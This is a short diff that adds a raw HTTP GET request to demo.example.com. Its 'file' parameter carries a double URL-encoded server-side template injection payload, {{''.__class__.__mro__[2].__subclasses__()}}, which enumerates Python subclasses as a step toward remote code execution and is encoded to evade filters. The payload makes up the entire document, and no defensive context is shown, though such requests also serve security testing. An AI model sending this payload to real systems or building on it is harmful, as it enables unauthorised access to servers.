@@ -1,0 +1,4 @@
+GET /a?file=%257B%257B%2527%2527.__class__.__mro__%255B2%255D.__subclasses__%2528%2529%257D%257D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
